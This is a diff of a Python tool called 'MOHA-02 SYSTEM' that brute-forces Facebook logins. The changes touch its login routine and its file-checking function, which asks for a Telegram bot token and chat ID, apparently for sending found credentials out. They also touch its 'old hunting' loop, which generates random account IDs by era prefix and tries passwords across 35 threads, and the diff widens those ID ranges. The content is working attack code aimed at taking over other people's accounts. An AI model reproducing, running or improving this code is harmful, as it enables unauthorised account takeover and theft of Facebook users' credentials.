@@ -1,4 +1,4 @@
-# -*- 
+
 # --------------------------------------------------------
 # Tool Name: MOHA-02 SYSTEM (Ultimate Edition)
 # Developer: Moha Al-Shalfawi (@m_oha_02)
@@ -65,7 +65,7 @@ def login_fb(user, pw, chat_id, bot_token):
             print(f"\n{R}[!] API BANNED! Use Airplane Mode & Retry.")
         else:
             bad += 1
-            sys.stdout.write(f"\r{W}[Checking] {hits}/{cp}/{bad} | {user[:10]}..."); sys.stdout.flush()
+            sys.stdout.write(f"\r{W}[MOHA02 🖤] {hits}/{cp}/{bad} | {user} "); sys.stdout.flush()
     except: pass
 
 def tool_extract():
@@ -99,7 +99,7 @@ def tool_check_file():
     bot_token = input(f"{G}[+] Bot Token: {B}")
     chat_id = input(f"{G}[+] Chat ID: {B}")
     
-    num_pass = int(input(f"{G}[+] Pass Limit (per ID): {P}"))
+    num_pass = int(input(f"{G}[+] Pass Limit: {P}"))
     custom_passes = [input(f"{C}  └─ Pass {i+1}: {B}") for i in range(num_pass)]
         
     try:
@@ -128,12 +128,17 @@ def tool_old_hunting():
     print(f"{Y}[*] Hunting Started...")
     with ThreadPoolExecutor(max_workers=35) as pool:
         while not stop_check:
-            if year == '1': uid = str(random.randint(100000, 99000000))
-            elif year == '2': uid = "1000000" + str(random.randint(10000, 99999))
-            elif year == '3': uid = "100001" + str(random.randint(100000, 999999))
-            elif year == '4': uid = "100005" + str(random.randint(100000, 999999))
+            if year == '1': 
+                uid = str(random.randint(100000, 99000000))
+            elif year == '2': 
+                uid = "100000" + str(random.randint(400000000, 999999999))
+            elif year == '3': 
+                uid = "100001" + str(random.randint(100000000, 999999999))
+            elif year == '4': 
+                uid = "100005" + str(random.randint(100000000, 999999999))
             else: break
-            for pw in passwords: pool.submit(login_fb, uid, pw, chat_id, bot_token)
+            for pw in passwords: 
+                pool.submit(login_fb, uid, pw, chat_id, bot_token)
 
 def main():
     join_channel()
